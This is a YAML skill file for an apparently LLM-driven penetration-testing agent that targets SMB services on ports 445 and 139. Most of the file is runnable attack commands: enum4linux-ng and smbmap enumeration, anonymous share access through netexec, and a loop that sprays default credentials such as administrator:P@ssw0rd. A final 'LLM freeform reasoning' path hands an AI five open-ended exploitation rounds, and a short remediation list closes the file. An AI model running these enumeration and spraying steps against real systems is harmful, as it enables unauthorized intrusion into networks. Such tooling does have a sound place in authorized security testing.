skill_id: smb_enum_exploit
name: "SMB Enumeration and Exploitation"
category: server_misconfig
version: "1.0"

principle: |
  SMB (Server Message Block) on ports 445/139 can expose shares, users, and
  system info. Null sessions, anonymous access, and known CVEs (EternalBlue)
  are common attack vectors. Tools: enum4linux-ng, smbmap, netexec.

match:
  rules:
    - fingerprint_contains: ["smb"]
      port_is: [445, 139]
    - fingerprint_contains: ["microsoft-ds"]
    - fingerprint_contains: ["netbios"]
    - evidence_contains: ["smb"]
    - evidence_contains: ["samba"]
    - evidence_contains: ["ms17-010"]
    - cve_matches:
        - "CVE-2017-0144"

probes:
  - id: smb_enum
    description: "enum4linux-ng full enumeration"
    command: |
      echo "=== SMB Enumeration ==="
      enum4linux-ng -A {TARGET_IP} 2>/dev/null | head -100
      echo "SMB_ENUM_DONE"
    timeout: 60
    parse_rules:
      - if_contains: ["Anonymous login"]
        set: { smb_anon: true }
      - if_contains: ["READ"]
        set: { smb_readable_shares: true }
      - if_contains: ["WRITE"]
        set: { smb_writable_shares: true }
      - if_contains: ["Domain:"]
        set: { domain_found: true }

  - id: smbmap_check
    description: "smbmap share permissions"
    command: |
      echo "=== SMBMap ==="
      smbmap -H {TARGET_IP} 2>/dev/null
      echo "SMBMAP_DONE"
    timeout: 30
    parse_rules:
      - if_contains: ["READ"]
        set: { smb_readable_shares: true }
      - if_contains: ["WRITE"]
        set: { smb_writable_shares: true }

exploit_paths:
  - path_id: smb_anon_access
    name: "SMB Anonymous Share Access"
    priority: 1
    conditions:
      smb_readable_shares: true
    steps:
      - id: list_shares
        description: "List and read accessible shares"
        command: |
          echo "=== SMB Share Access ==="
          smbmap -H {TARGET_IP} -r 2>/dev/null | head -50
          echo "---"
          netexec smb {TARGET_IP} -u '' -p '' --shares 2>/dev/null | head -20
          echo "SMB_ACCESS_DONE"
        timeout: 30
        success_criteria:
          stdout_contains_any: ["READ", "WRITE", "SMB_ACCESS_DONE"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "smb_access"

  - path_id: smb_cred_spray
    name: "SMB Credential Spray"
    priority: 2
    steps:
      - id: netexec_spray
        description: "netexec default credential spray"
        command: |
          echo "=== SMB Credential Spray ==="
          for cred in administrator:password admin:admin guest: administrator:P@ssw0rd; do
            u=$(echo "$cred" | cut -d: -f1)
            p=$(echo "$cred" | cut -d: -f2)
            result=$(netexec smb {TARGET_IP} -u "$u" -p "$p" 2>/dev/null)
            echo "$result"
            if echo "$result" | grep -q "+"; then
              echo "SMB_CRED_FOUND:$u:$p"
              exit 0
            fi
          done
          echo "SMB_SPRAY_FAILED"
        timeout: 60
        success_criteria:
          stdout_contains_any: ["SMB_CRED_FOUND", "[+]"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "smb_auth"

  - path_id: llm_freeform
    name: "LLM freeform reasoning"
    priority: 99
    mode: react_freeform
    max_rounds: 5

remediation: |
  1. Disable SMBv1 and null sessions
  2. Restrict share permissions to minimum necessary
  3. Apply MS17-010 and other security patches
  4. Use network segmentation to limit SMB exposure
